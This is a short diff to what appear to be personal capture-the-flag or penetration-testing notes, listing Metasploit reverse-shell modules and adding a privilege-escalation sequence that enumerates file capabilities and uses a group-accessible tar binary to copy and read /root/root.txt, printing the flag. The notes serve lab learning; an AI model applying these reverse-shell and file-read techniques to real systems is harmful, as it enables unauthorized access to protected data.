@@ -7,3 +7,17 @@ linux/x86/shell_reverse_tcp
 
 # reverse shell to meterpreter
 post/multi/manage/shell_to_meterpreter
+
+# show the permisson
+rookie@rookie:/tmp$ getcap -r / 2>/dev/null
+/usr/bin/ping = cap_net_raw+ep
+norris@sirrom:/tmp$ ls -laht /usr/bin/tar
+-r-xr-x--- 1 root norris 436K Apr 23 2019 /usr/bin/tar
+
+# permission hint
+
+rookie@rookie:/tmp/etc$ /usr/bin/tar -cvf root_txt.tar /root/root.txt
+rookie@rookie:/tmp/etc$ tar -xvf root_txt.tar
+root/root.txt
+rookie@rookie:/tmp/etc$ cat root/root.txt
+8fc9376d961670ca10be270d52eda423
